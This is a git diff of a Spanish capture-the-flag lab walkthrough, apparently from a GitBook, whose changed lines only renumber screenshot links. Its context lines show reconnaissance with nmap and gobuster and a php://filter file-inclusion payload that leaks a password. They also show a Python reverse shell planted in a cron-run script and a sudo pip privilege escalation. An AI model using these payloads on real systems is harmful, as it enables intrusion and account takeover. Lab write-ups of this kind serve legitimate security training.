@@ -14,7 +14,7 @@ ping -c 1 192.168.1.60
 
 para verificar la conectividad de red.
 
-<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>
 
 A continuación, se realiza el comando:
 
@@ -24,7 +24,7 @@ nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 192.168.1.60 -oG allPorts
 
 para realizar un escaneo de puertos y servicios detallado en la dirección IP.
 
-<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>
 
 Como podemos observar durante el escaneo, los puertos 80, 111, 3333 y 35263 están abiertos. El **puerto 80** pertenece al servicio **HTTP**, lo que indica la presencia de un servidor web. El **puerto 111** está asociado con el servicio **rpcbind**, comúnmente utilizado para gestionar servicios RPC (Remote Procedure Call). El **puerto 3333** corresponde al servicio **dec-notes**, mientras que el **puerto 35263** está identificado como un servicio **desconocido**.
 
@@ -38,11 +38,11 @@ sudo nmap -sCV -p80,111,3333,35263 -v 192.168.1.60
 
 para obtener más información sobre ese puerto específicamente.
 
-<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>
 
 Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Se ingresó la dirección IP en el navegador, lo que llevó a que la página web sobre una página de una tienda de Vibranium.
 
-<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
 
 Ahora buscaremos directorios con la herramienta **Gobuster** a través de:&#x20;
 
@@ -50,11 +50,11 @@ Ahora buscaremos directorios con la herramienta **Gobuster** a través de:&#x20;
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml,js -u http://192.168.1.60
 ```
 
-<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que hay un archivo `secret.txt` por lo que accederemos a él aunque no hay nada interesante solo nos estaban vacilando. También  muchos directorios tienen **tamaño 0** así seguimos indagando.
 
-<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
 
 Ahora buscaremos exploits con la herramienta **Searchsploit** a través de:&#x20;
 
@@ -62,7 +62,7 @@ Ahora buscaremos exploits con la herramienta **Searchsploit** a través de:&#x20
 searchsploit rpcbind
 ```
 
-<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
 
 No obtenemos algo relevante por lo que probamos indagar **SSH**. No tuvimos suerte probando contraseñas comunes.
 
@@ -70,11 +70,11 @@ No obtenemos algo relevante por lo que probamos indagar **SSH**. No tuvimos suer
 ssh -p 3333 root@192.168.1.60
 ```
 
-<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
 
 Revisamos el código fuente por si hay alguna información relevante que se nos haya escapado.
 
-<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>
 
 Hay una sección de código comentada que incluye un parámetro `?lang=fr`, que probablemente se utiliza para cambiar el idioma a francés. Vamos a probar esto.
 
@@ -82,7 +82,7 @@ Hay una sección de código comentada que incluye un parámetro `?lang=fr`, que 
 http://192.168.1.60/?lang=fr
 ```
 
-<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>
 
 ### 🚀 **EXPLOTACIÓN**
 
@@ -101,13 +101,13 @@ Después de numerosos intentos, logramos explotar la vulnerabilidad de inclusió
 http://192.168.1.60/?lang=php://filter/convert.base64-encode/resource=index
 ```
 
-<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>
 
 Creamos un archivo utilizando la cadena codificada y luego procedemos a decodificarlo empleando un decodificador Base64.
 
-<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>
 
 Al decodificar la cadena codificada en **Base64**, descubrimos la contraseña la cual, junto con la información de que **mamadou** es el autor, nos permite iniciar sesión a través de SSH en la máquina objetivo.
 
@@ -115,7 +115,7 @@ Al decodificar la cadena codificada en **Base64**, descubrimos la contraseña la
 ssh mamadou@192.168.1.60 -p 3333
 ```
 
-<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
 
 ### 🔐 **PRIVILEGIOS**
 
@@ -126,11 +126,11 @@ import pty
 pty.spawn('/bin/bash')
 ```
 
-<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
 
 Esta es la primera flag pero nos faltan dos.
 
-<figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>
 
 Sin embargo, no podemos acceder al archivo porque está propiedad de otro usuario llamado `devops`. Necesitamos elevar nuestros privilegios al usuario `devops` para poder acceder al archivo.
 
@@ -140,7 +140,7 @@ Primero, examinemos los tipos de usuarios presentes en el sistema.
 cat /etc/passwd
 ```
 
-<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
 
 Para escalar privilegios, debemos identificar un archivo que sea propiedad del grupo `devops` y que pueda ser ejecutado por el usuario `mamadou`. Si existe tal archivo, podríamos usarlo para elevar nuestros privilegios.
 
@@ -150,7 +150,7 @@ Primero, obtengamos información sobre el sistema:
 uname -a
 ```
 
-<figure><img src="../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>
 
 Ahora, busquemos todos los archivos que sean propiedad del usuario `devops`.
 
@@ -158,7 +158,7 @@ Ahora, busquemos todos los archivos que sean propiedad del usuario `devops`.
 find / -user devops
 ```
 
-<figure><img src="../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>
 
 Hemos encontrado un archivo interesante llamado `/srv/.antivirus.py` al que podemos acceder, además de los archivos que ya hemos encontrado. Procedamos con su análisis.
 
@@ -172,7 +172,7 @@ with open('/tmp/test', 'w') as f:
 
 Hicimos un intento de modificar el script de Python para acceder a `flag2.txt`, pero actualmente no tenemos los permisos necesarios para el directorio `/tmp/test`.
 
-<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
 
 Sin embargo, dado que podemos ejecutar el script con éxito, procederemos a intentar una shell reversa en Python.
 
@@ -203,11 +203,11 @@ os.dup2(s.fileno(), 2)
 subprocess.call(["/bin/sh", "-i"])
 ```
 
-<figure><img src="../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>
 
 El script se ejecutó con éxito, pero solo obtuvimos conexiones como el usuario `mamadou`. Es posible que el script se ejecute automáticamente como un trabajo cron bajo el usuario `devops`. Vamos a esperar un breve periodo de tiempo mientras escuchamos las conexiones.
 
-<figure><img src="../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>
 
 Al ejecutar el script, obtuvimos una shell reversa. Es probable que un crontab o un cronjob sea el responsable de esta ejecución.
 
@@ -219,7 +219,7 @@ Primero, verifiquemos los permisos que tenemos como usuario `devops` con el sigu
 sudo -l
 ```
 
-<figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>
 
 El comando `pip` actúa como un gestor de paquetes de Python. Vamos a aprovechar una vulnerabilidad en `pip`.
 
@@ -258,6 +258,6 @@ Para transferir el archivo `setup.py` al equipo objetivo, sigue estos pasos:
     sudo /usr/bin/pip install . --upgrade --force-reinstall
     ```
 
-<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>
 
 Hemos **completado con éxito** todas las etapas del proceso y **cumplido con todos los requisitos**.
